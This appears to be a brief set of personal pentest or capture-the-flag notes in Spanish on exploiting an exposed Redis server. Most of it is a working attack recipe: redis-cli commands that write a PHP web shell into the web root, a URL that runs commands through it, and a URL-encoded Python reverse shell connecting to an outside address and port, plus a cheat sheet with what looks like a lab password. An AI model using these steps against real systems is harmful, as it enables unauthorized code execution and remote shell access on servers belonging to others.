
conexion: redis-cli -h 10.10.12.10 -p 4568

######################### EN redis se pueden subir cosas para ingresar por web
 10.201.96.122:6379> config set dir /var/www/html
 OK
 10.201.96.122:6379> config set dbfilename "shell.php"
 OK
 10.201.96.122:6379> set test "<?php system($_GET['c']) ?>"
 OK

visitando por web nos devuelve comandos y podemos usar una shell reversa.
- http://10.201.96.122/shell.php?c=id

- http://10.201.96.122/shell.php?c=export%20RHOST=%22192.168.179.131%22;export%20RPORT=9003;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27


comandos:
redis-cli -h ip -p 111 -> conexion 
auth B65Hx562F@ggAZ@F -> logear
keys * -> muestra llaves
get "nombre llave" -> mostrar contenido

